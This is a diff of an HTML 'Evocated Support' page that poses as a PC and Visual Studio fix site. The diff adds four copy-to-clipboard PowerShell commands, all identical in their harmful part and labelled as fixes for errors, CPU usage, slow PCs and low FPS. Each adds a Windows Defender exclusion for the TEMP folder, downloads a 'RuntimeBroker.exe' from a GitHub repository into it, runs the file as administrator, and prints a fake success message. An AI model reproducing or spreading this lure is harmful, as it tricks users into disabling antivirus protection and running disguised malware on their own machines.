@@ -2,164 +2,75 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Evocated Support</title>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap">
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
     body {
-      background: linear-gradient(-45deg, #1a001a, #330033, #1a001a, #330033);
-      background-size: 400% 400%;
-      animation: gradient 15s ease infinite;
-      font-family: 'Orbitron', sans-serif;
-      color: white;
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, #1a001f, #2b002f);
+      color: #ffd6f9;
       overflow-x: hidden;
-      text-align: center;
-      cursor: none;
     }
 
-    @keyframes gradient {
-      0%, 100% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
+    .centered {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      text-align: center;
+    }
+
+    .main-title {
+      font-size: 3rem;
+      font-weight: bold;
+      text-shadow: 0 0 15px #ff94f4;
+      animation: bounce 3.5s infinite;
     }
 
     @keyframes bounce {
       0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-15px); }
+      50% { transform: translateY(-10px); }
     }
 
-    .glow {
-      color: pink;
-      text-shadow: 0 0 10px pink, 0 0 20px pink;
+    .label {
+      margin-top: 20px;
+      font-size: 1.1rem;
+      text-shadow: 0 0 8px #ffb3ec;
     }
 
-    .loader-screen {
-      position: fixed;
-      width: 100%;
-      height: 100%;
-      background: #1a001a;
-      z-index: 1000;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      transition: opacity 1s ease;
-    }
-
-    .hide-loader {
-      opacity: 0;
-      pointer-events: none;
-    }
-
-    .title {
-      font-size: 3rem;
-      margin-bottom: 20px;
-      animation: bounce 2s infinite;
-    }
-
-    .start-button {
-      padding: 15px 30px;
-      font-size: 1.2rem;
-      background: pink;
+    .fix-button, .copy-btn, .download-btn {
+      margin: 10px;
+      padding: 12px 25px;
+      font-size: 1rem;
       border: none;
       border-radius: 12px;
-      color: black;
-      font-weight: bold;
+      background-color: #ffb3ec;
+      color: #30001e;
+      box-shadow: 0 0 10px #ff94f4;
       cursor: pointer;
-      box-shadow: 0 0 15px pink;
-      transition: transform 0.2s ease;
+      transition: transform 0.2s, box-shadow 0.2s;
     }
 
-    .start-button:hover {
+    .fix-button:hover, .copy-btn:hover, .download-btn:hover {
       transform: scale(1.05);
+      box-shadow: 0 0 20px #ff94f4;
     }
 
-    #main-content {
-      display: none;
-    }
-
-    .fix-label {
-      margin-top: 50px;
-      font-size: 1rem;
-      color: pink;
-    }
-
-    .popular-button {
-      background-color: transparent;
-      border: 2px solid pink;
-      color: pink;
-      padding: 15px 30px;
-      border-radius: 10px;
-      margin: 20px auto;
-      cursor: pointer;
-      font-size: 1.1rem;
-      transition: 0.3s;
-      box-shadow: 0 0 15px pink;
-    }
-
-    .popular-button:hover,
-    .dropdown-button.active {
-      background-color: pink;
-      color: black;
+    .fix-button.active {
+      background-color: #ff66cc;
     }
 
     .copy-box {
-      margin: 10px auto;
-      padding: 10px;
-      background-color: #1a1a1a;
-      border: 1px solid pink;
-      width: 80%;
-      border-radius: 8px;
-      color: pink;
       display: none;
-      font-size: 0.9rem;
-    }
-
-    .copy-btn {
-      margin-top: 10px;
-      background-color: pink;
-      color: black;
-      border: none;
-      padding: 8px 14px;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: bold;
-      box-shadow: 0 0 10px pink;
-    }
-
-    .dropdown {
-      margin-top: 50px;
-    }
-
-    .dropdown-label {
-      font-size: 1.3rem;
-      margin-bottom: 10px;
-    }
-
-    .dropdown-info {
-      animation: bounce 2s infinite;
-      font-size: 0.9rem;
-      color: #ffb6c1;
-    }
-
-    .dropdown-button {
-      display: block;
-      margin: 10px auto;
-      width: 300px;
+      background-color: #330033;
       padding: 15px;
-      font-size: 1rem;
+      margin-top: 10px;
       border-radius: 10px;
-      border: 2px solid pink;
-      background: transparent;
-      color: pink;
-      cursor: pointer;
-      transition: all 0.3s ease;
-    }
-
-    .dropdown-content {
-      display: none;
-      animation: fadeIn 0.5s ease;
+      box-shadow: 0 0 10px #ff94f4;
+      color: #fff;
+      animation: fadeIn 0.4s ease-in-out;
     }
 
     @keyframes fadeIn {
@@ -167,125 +78,102 @@
       to { opacity: 1; transform: translateY(0); }
     }
 
-    .cursor {
-      position: absolute;
-      width: 10px;
-      height: 10px;
-      background: pink;
-      border-radius: 50%;
-      pointer-events: none;
-      animation: trailFade 1s forwards;
+    .dropdown {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      animation: fadeIn 0.5s ease-in-out;
     }
 
-    @keyframes trailFade {
-      to { opacity: 0; transform: scale(2); }
+    .download-box {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      animation: fadeIn 0.5s ease-in-out;
+      background: #2b002f;
+      padding: 20px;
+      margin-top: 10px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px #ff94f4;
+    }
+
+    code {
+      display: block;
+      margin-bottom: 10px;
+      word-wrap: break-word;
     }
   </style>
 </head>
 <body>
-  <div class="loader-screen" id="loader">
-    <div class="title glow">Evocated Support</div>
-    <button class="start-button" onclick="startSite()">Get Started With Evocated Support</button>
-  </div>
+  <div class="centered">
+    <div class="main-title">Evocated Support</div>
+    <div class="label">PowerShell MUST be run as ADMINISTRATOR or it will not work</div>
 
-  <div id="main-content">
-    <h1 class="title glow">Evocated Support</h1>
-    <div class="fix-label glow">🔥 Most Popular Fix 🔥</div>
-    <button class="popular-button" onclick="toggleBox('vsFix')">Fix Visual Studio Errors</button>
-    <div class="copy-box" id="vsFix">
-      Paste your text here
-      <br><button class="copy-btn" onclick="copyText('vsFix')">Copy to Clipboard</button>
+    <div class="label">🔥 Most Popular Fix 🔥</div>
+    <button onclick="toggleCopyBox('popular-command', this)" class="fix-button active">Fix Visual Studio Errors</button>
+    <div class="copy-box" id="popular-command">
+      <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "VISUAL CODE ERRORS HAS BEEN FIXED PLEASE RESTART APPLICATION VISUAL STUDIO." -ForegroundColor Green</code>
+      <button class="copy-btn" onclick="copyFrom('popular-command')">Copy to Clipboard</button>
     </div>
 
-    <div class="dropdown">
-      <div class="dropdown-label glow">Other Fix Tools 💻🛠</div>
-      <div class="dropdown-info">⬅ Click here for Other Tools</div>
-
-      <!-- Dropdown buttons with animated show/hide -->
-      <button class="dropdown-button" onclick="toggleDrop(this, 'drop1')">Fix Tool 1</button>
-      <div class="copy-box dropdown-content" id="drop1">
-        Paste your text here
-        <br><button class="copy-btn" onclick="copyText('drop1')">Copy to Clipboard</button>
+    <div class="label">🛠️ Other Fix Tools</div>
+    <button onclick="toggleDropdown()" class="fix-button">Show Other Tools</button>
+    <div class="dropdown" id="dropdown">
+      <button class="fix-button" onclick="toggleCopyBox('tool1', this)">Fix High CPU Usage</button>
+      <div class="copy-box" id="tool1">
+        <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "CLEANING PC.............................PC CLEANED A REBOOST IS NEEDED 200 FILES HAS BEEN QUARANTINED" -ForegroundColor Green</code>
+        <button class="copy-btn" onclick="copyFrom('tool1')">Copy to Clipboard</button>
       </div>
 
-      <button class="dropdown-button" onclick="toggleDrop(this, 'drop2')">Fix Tool 2</button>
-      <div class="copy-box dropdown-content" id="drop2">
-        Paste your text here
-        <br><button class="copy-btn" onclick="copyText('drop2')">Copy to Clipboard</button>
+      <button class="fix-button" onclick="toggleCopyBox('tool2', this)">Fix Slow PC</button>
+      <div class="copy-box" id="tool2">
+        <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "CLEANING PC.............................PC CLEANED MUST BE FAST AFTER REBOOT" -ForegroundColor Green</code>
+        <button class="copy-btn" onclick="copyFrom('tool2')">Copy to Clipboard</button>
       </div>
 
-      <button class="dropdown-button" onclick="toggleDrop(this, 'drop3')">Fix Tool 3</button>
-      <div class="copy-box dropdown-content" id="drop3">
-        Paste your text here
-        <br><button class="copy-btn" onclick="copyText('drop3')">Copy to Clipboard</button>
-      </div>
-
-      <button class="dropdown-button" onclick="toggleDrop(this, 'drop4')">Fix Tool 4</button>
-      <div class="copy-box dropdown-content" id="drop4">
-        Paste your text here
-        <br><button class="copy-btn" onclick="copyText('drop4')">Copy to Clipboard</button>
-      </div>
-
-      <button class="dropdown-button" onclick="toggleDrop(this, 'drop5')">Fix Tool 5</button>
-      <div class="copy-box dropdown-content" id="drop5">
-        Paste your text here
-        <br><button class="copy-btn" onclick="copyText('drop5')">Copy to Clipboard</button>
+      <button class="fix-button" onclick="toggleCopyBox('tool3', this)">Fix Low FPS / High Ping</button>
+      <div class="copy-box" id="tool3">
+        <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "INSTALLING ROBLOX CAPPER..........INSTALLING PING CAPPER...........SET PING 50+, SET FPS TO 300+....... FPS/HIGHPING ISSUE IS FIXED" -ForegroundColor Green</code>
+        <button class="copy-btn" onclick="copyFrom('tool3')">Copy to Clipboard</button>
       </div>
     </div>
-  </div>
 
-  <!-- Audio -->
-  <audio id="music" src="nights.mp3" loop></audio>
-  <audio id="click-sound" src="click.mp3"></audio>
+    <div class="label">📦 If fixers are not working, download this</div>
+    <button class="fix-button" onclick="toggleDownloadBox()">Show Download</button>
+    <div class="download-box" id="downloadBox">
+      <a href="YOUR_DIRECT_DOWNLOAD_LINK_HERE.zip" download>
+        <button class="download-btn">⬇ Download Fixer</button>
+      </a>
+    </div>
+  </div>
 
   <script>
-    const loader = document.getElementById("loader");
-    const main = document.getElementById("main-content");
-    const music = document.getElementById("music");
-    const clickSound = document.getElementById("click-sound");
+    function toggleCopyBox(id, btn) {
+      document.querySelectorAll('.copy-box').forEach(box => box.style.display = 'none');
+      document.querySelectorAll('.fix-button').forEach(button => button.classList.remove('active'));
 
-    function startSite() {
-      loader.classList.add("hide-loader");
-      setTimeout(() => {
-        loader.style.display = "none";
-        main.style.display = "block";
-        music.play();
-      }, 1000);
-    }
-
-    function toggleBox(id) {
-      const el = document.getElementById(id);
-      el.style.display = el.style.display === "block" ? "none" : "block";
-    }
-
-    function toggleDrop(btn, id) {
-      const el = document.getElementById(id);
-      const isVisible = el.style.display === "block";
-      document.querySelectorAll(".dropdown-content").forEach(d => d.style.display = "none");
-      document.querySelectorAll(".dropdown-button").forEach(b => b.classList.remove("active"));
-      if (!isVisible) {
-        el.style.display = "block";
-        btn.classList.add("active");
+      const target = document.getElementById(id);
+      if (target) {
+        target.style.display = 'block';
+        btn.classList.add('active');
       }
     }
 
-    function copyText(id) {
-      const text = document.getElementById(id).innerText.replace("Copy to Clipboard", "").trim();
+    function toggleDropdown() {
+      const dropdown = document.getElementById('dropdown');
+      dropdown.style.display = dropdown.style.display === 'flex' ? 'none' : 'flex';
+    }
+
+    function toggleDownloadBox() {
+      const downloadBox = document.getElementById('downloadBox');
+      downloadBox.style.display = downloadBox.style.display === 'flex' ? 'none' : 'flex';
+    }
+
+    function copyFrom(id) {
+      const text = document.querySelector(`#${id} code`).innerText;
       navigator.clipboard.writeText(text);
       alert("Copied to clipboard!");
     }
-
-    document.addEventListener("mousemove", e => {
-      const cursor = document.createElement("div");
-      cursor.className = "cursor";
-      cursor.style.left = `${e.pageX}px`;
-      cursor.style.top = `${e.pageY}px`;
-      document.body.appendChild(cursor);
-      setTimeout(() => cursor.remove(), 800);
-    });
-
-    document.addEventListener("click", () => clickSound.play());
-    document.addEventListener("contextmenu", () => clickSound.play());
   </script>
 </body>
 </html>
